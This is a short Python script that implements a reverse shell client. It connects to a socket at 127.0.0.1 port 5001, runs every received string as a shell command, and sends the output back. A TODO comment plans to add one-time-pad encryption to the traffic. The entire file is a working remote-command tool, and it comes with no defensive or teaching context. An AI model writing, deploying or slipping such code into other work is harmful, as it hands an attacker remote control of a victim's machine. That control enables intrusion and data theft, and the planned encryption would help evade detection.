import socket, subprocess

# TODO: Implement ONE TIME PAD Encryption

def main():
    rev_sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    rev_sck.connect(('127.0.0.1', 5001))

    try:
        while True:
            cmd = rev_sck.recv(8148).decode()
            if cmd == '':
                rev_sck.close()
                exit(0)
            rev_sck.sendall(subprocess.check_output(cmd, shell = True))
    except KeyboardInterrupt:
        rev_sck.close()
        exit(0)

main()